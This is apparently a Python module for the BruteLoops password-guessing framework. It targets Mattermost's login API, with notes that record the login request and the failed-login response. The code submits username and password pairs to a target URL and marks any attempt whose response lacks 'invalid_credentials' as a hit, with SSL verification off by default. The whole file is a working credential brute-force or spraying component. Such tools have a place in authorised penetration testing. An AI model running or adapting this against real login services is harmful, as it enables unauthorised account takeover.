
from re import search
import requests
import warnings
import urllib
warnings.filterwarnings('ignore')
from BruteLoops.example.module import Module as BLModule

'''
# Notes

## Authentication Request

POST /api/v4/users/login HTTP/1.1
Host: mattermost.xxxxxxxxxxx.com
Connection: close
Content-Length: 78
Sec-Fetch-Dest: empty
X-Requested-With: XMLHttpRequest
Accept-Language: en
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://mattermost.xxxxxxxxxxx.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate

{"device_id":"","login_id":"thisis@bhis.com","password":"password","token":""}

## Authentication Response (FAIL)

HTTP/1.1 401 Unauthorized
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 14 Feb 2020 19:43:20 GMT
Content-Type: application/json
Content-Length: 199
Connection: close
Strict-Transport-Security: max-age=63072000
Vary: Accept-Encoding

{"id":"api.user.login.invalid_credentials_email_username","message":"Enter a valid email or username and/or password.","detailed_error":"","request_id":"n69gxwj1spyapey6h4mnxshtgc","status_code":401}
'''

class Module(BLModule):

    name='http.mattermost'
    description = brief_description = 'Mattermost login web interface'

    def __init__(self,url:'required:True,type:str,help:URL to target',
            headers:'required:False,type:str,help:HTTP headers'={},
            proxies:'required:False,type:str,help:HTTP proxies'={},
            verify_ssl:'required:False,type:bool,help:Verify SSL'=False):

        # Align headers to avoid issues
        if not 'Sec-Fetch-Dest' in headers:
            headers['Sec-Fetch-Dest'] = 'empty'
        if not 'X-Requested-With' in headers:
            headers['X-Requested-With'] = 'XMLHttpRequest'
        if not 'User-Agent' in headers:
            headers['User-Agent'] = 'User-Agent: Mozilla/5.0 (X11; Linu' \
                'x x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrom' \
                'e/80.0.3987.66 Safari/537.36'
        if not 'Sec-Fetch-Site' in headers:
            headers['Sec-Fetch-Site'] = 'same-origin'
        if not 'Sec-Fetch-Mode' in headers:
            headers['Sec-Fetch-Mode'] = 'cors'

        
        self.url = url
        self.headers = headers
        self.proxies = proxies
        self.verify_ssl = verify_ssl

    def __call__(self,username,password):

        data = {
            'device_id':'',
            'login_id':username,
            'password':password,
            'token':'',
        }

        resp = requests.post(
            self.url,
            json=data,
            headers=self.headers,
            verify=self.verify_ssl,
            allow_redirects=False,
            proxies=self.proxies
        )

        if resp.text.find('invalid_credentials') > -1:
            return [0,username,password]
        else:
            return [1,username,password]
